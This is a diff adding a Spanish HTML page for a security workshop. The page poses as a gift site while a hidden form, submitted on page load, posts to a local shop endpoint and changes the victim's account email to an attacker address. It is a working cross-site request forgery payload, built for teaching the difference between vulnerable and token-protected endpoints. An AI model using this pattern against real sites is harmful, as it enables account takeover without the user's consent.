@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tu regalo 🎁</title>
+    <style>
+        body { font-family: system-ui, sans-serif; background: #111827; color: #f9fafb;
+               max-width: 640px; margin: 40px auto; padding: 0 16px; }
+        .evil { background: #7f1d1d; color: #fff; padding: 8px 12px; border-radius: 6px;
+                font-size: 0.8rem; display: inline-block; }
+        h1 { margin: 16px 0; }
+        pre { background: #1f2937; padding: 12px; border-radius: 6px; white-space: pre-wrap; }
+    </style>
+</head>
+<body>
+    <span class="evil">SITIO ATACANTE · http://127.0.0.1:4000 (demo del taller)</span>
+    <h1>🎁 Abriendo tu regalo…</h1>
+    <p>Esperá un momento mientras preparamos tu sorpresa.</p>
+
+    <!--
+        Ataque CSRF (M5). Formulario OCULTO que se envia solo al cargar la pagina.
+        Apunta a la tienda: cambia el correo de la cuenta de la victima SIN su
+        consentimiento. Usa un form (no fetch) porque el endpoint recibe un
+        parametro de formulario (email), y asi el navegador adjunta la cookie de
+        sesion de la tienda si es SameSite=None.
+
+        - VULNERABLE: la tienda solo comprueba la sesion -> cambia el correo.
+        - SEGURA: exige el token CSRF (X-XSRF-TOKEN) -> responde 403.
+
+        Requiere el modulo M5 (endpoint POST /api/account/email y cookie
+        SameSite=None), aun por construir (C8/C9).
+    -->
+    <form id="csrf-form" action="http://localhost:3000/api/account/email"
+          method="POST" target="sink" style="display:none;">
+        <input type="hidden" name="email" value="atacante@evil.test">
+    </form>
+    <iframe name="sink" style="display:none;"></iframe>
+
+    <pre id="estado"></pre>
+    <script src="csrf.js"></script>
+</body>
+</html>
